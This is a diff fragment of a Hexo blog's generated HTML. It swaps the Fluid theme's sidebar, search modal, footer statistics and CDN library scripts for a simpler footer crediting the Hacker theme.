-  </article>
-
-
-          </article>
-        </div>
-      </div>
-    </div>
-
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-  <aside class="sidebar" style="margin-left: -1rem">
-    <div id="toc">
-  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
-  <div class="toc-body" id="toc-body"></div>
-</div>
-
-
-
-  </aside>
-
+    
 
     </div>
+
+    
+  </div>
+</article>
+
+  
+
+
+
+
+
+
+
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    </br>
+    
+    &copy; 2023 Loora1N
+    
+  </p>
+</footer>
+    
+    
   </div>
 </div>
-
-
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-
-
-
-
-    
-
-    
-      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
-        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
-      </a>
-    
-
-    
-      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
-    </div>
-  </div>
-</div>
-
-    
-
-    
-  </main>
-
-  <footer>
-    <div class="footer-inner">
-  
-    <div class="footer-content">
-       <a href="https://github.com/Loora1N" target="_blank" rel="nofollow noopener"><span>Loora1N</span></a> <i class="iconfont icon-love"></i> <a href="https://space.bilibili.com/33242548?spm_id_from=333.1007.0.0" target="_blank" rel="nofollow noopener"><span>鷺雨君</span></a>
-    </div>
-  
-  
-    <div class="statistics">
-  
-  
-
-  
-    
-      <span id="leancloud-site-pv-container" style="display: none">
-        总访问量 
-        <span id="leancloud-site-pv"></span>
-         次
-      </span>
-    
-    
-      <span id="leancloud-site-uv-container" style="display: none">
-        总访客数 
-        <span id="leancloud-site-uv"></span>
-         人
-      </span>
-    
-    
-
-  
-</div>
-
-  
-  
-  
-  <span id="timeDate">载入天数...</span>
-  <span id="times">载入时分秒...</span>
-  <script>
-  var now = new Date();
-  function createtime(){
-      var grt= new Date("06/03/2022 00:00:00");//此处修改你的建站时间或者网站上线时间
-      now.setTime(now.getTime()+250);
-      days = (now - grt ) / 1000 / 60 / 60 / 24;
-      dnum = Math.floor(days);
-      hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
-      hnum = Math.floor(hours);
-      if(String(hnum).length ==1 ){
-          hnum = "0" + hnum;
-      }
-      minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
-      mnum = Math.floor(minutes);
-      if(String(mnum).length ==1 ){
-                mnum = "0" + mnum;
-      }
-      seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
-      snum = Math.round(seconds);
-      if(String(snum).length ==1 ){
-                snum = "0" + snum;
-      }
-      document.getElementById("timeDate").innerHTML = "🚀running🚀 for&nbsp"+dnum+"&nbspdays";  //此次自定义显示内容
-      document.getElementById("times").innerHTML = hnum + "&nbsphr&nbsp" + mnum + "&nbspmin&nbsp" + snum + "&nbspsec";
-  }  //此次自定义显示内容
-  setInterval("createtime()",250);
-  </script>   
-</div>
-
-  </footer>
-
-  <!-- Scripts -->
-  
-  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
-  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
-
-  <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
-    NProgress.start()
-    window.addEventListener('load', function() {
-      NProgress.done();
-    })
-  </script>
-
-
-<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
-<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
-
-
-  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
-  <script>
-    (function (window, document) {
-      var typing = Fluid.plugins.typing;
-      var subtitle = document.getElementById('subtitle');
-      if (!subtitle || !typing) {
-        return;
-      }
-      var text = subtitle.getAttribute('data-typed-text');
-      
-        typing(text);
-      
-    })(window, document);
-  </script>
-
-
-
-
-
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
-    var toc = jQuery('#toc');
-    if (toc.length === 0 || !window.tocbot) { return; }
-    var boardCtn = jQuery('#board-ctn');
-    var boardTop = boardCtn.offset().top;
-
-    window.tocbot.init(Object.assign({
-      tocSelector     : '#toc-body',
-      contentSelector : '.markdown-body',
-      linkClass       : 'tocbot-link',
-      activeLinkClass : 'tocbot-active-link',
-      listClass       : 'tocbot-list',
-      isCollapsedClass: 'tocbot-is-collapsed',
-      collapsibleClass: 'tocbot-is-collapsible',
-      scrollSmooth    : true,
-      includeTitleTags: true,
-      headingsOffset  : -boardTop,
-    }, CONFIG.toc));
-    if (toc.find('.toc-list-item').length > 0) {
-      toc.css('visibility', 'visible');
-    }
-
-    Fluid.events.registerRefreshCallback(function() {
-      if ('tocbot' in window) {
-        tocbot.refresh();
-        var toc = jQuery('#toc');
-        if (toc.length === 0 || !tocbot) {
-          return;
-        }
-        if (toc.find('.toc-list-item').length > 0) {
-          toc.css('visibility', 'visible');
-        }
-      }
-    });
-  });
-</script>
-
-
-  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
-
-  <script>Fluid.plugins.codeWidget();</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
-    window.anchors.options = {
-      placement: CONFIG.anchorjs.placement,
-      visible  : CONFIG.anchorjs.visible
-    };
-    if (CONFIG.anchorjs.icon) {
-      window.anchors.options.icon = CONFIG.anchorjs.icon;
-    }
-    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-    var res = [];
-    for (var item of el) {
-      res.push('.markdown-body > ' + item.trim());
-    }
-    if (CONFIG.anchorjs.placement === 'left') {
-      window.anchors.options.class = 'anchorjs-link-left';
-    }
-    window.anchors.add(res.join(', '));
-
-    Fluid.events.registerRefreshCallback(function() {
-      if ('anchors' in window) {
-        anchors.removeAll();
-        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-        var res = [];
-        for (var item of el) {
-          res.push('.markdown-body > ' + item.trim());
-        }
-        if (CONFIG.anchorjs.placement === 'left') {
-          anchors.options.class = 'anchorjs-link-left';
-        }
-        anchors.add(res.join(', '));
-      }
-    });
-  });
-</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
-    Fluid.plugins.fancyBox();
-  });
-</script>
-
-
-  <script>Fluid.plugins.imageCaption();</script>
-
-  <script defer src="/js/leancloud.js" ></script>
-
-  <script  src="/js/local-search.js" ></script>
-
-
-
-
-  
-<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/xiantiao.js"></script>
-<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/love.js"></script>
-<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/caidai.js"></script>
-
-
-
-<!-- 主题的启动项，将它保持在最底部 -->
-<!-- the boot of the theme, keep it at the bottom -->
-<script  src="/js/boot.js" ></script>
-
-
-  
-
-  <noscript>
-    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
-  </noscript>
 <!-- hexo injector body_end start -->
   <script data-pjax src="https://cdn.jsdelivr.net/gh/Zfour/hexo-github-calendar@1.21/hexo_githubcalendar.js"></script>
   <script data-pjax>
